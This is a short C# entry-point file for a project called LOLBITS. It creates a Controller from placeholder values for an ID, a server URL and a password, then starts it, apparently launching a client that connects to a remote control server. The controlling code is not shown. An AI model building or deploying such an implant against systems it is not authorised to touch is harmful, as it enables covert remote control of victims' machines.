using LOLBITS.Controlling;

namespace LOLBITS
{
    public class Program
    {        
        private const string _firstId = "<ident7>";
        private const string _url = "http://<ident6>/";
        private const string _password = "<ident3>";
               
        static void Main(string[] args)
        {
            var c = new Controller(_firstId, _url, _password);
            c.Start();
        }
    }
}
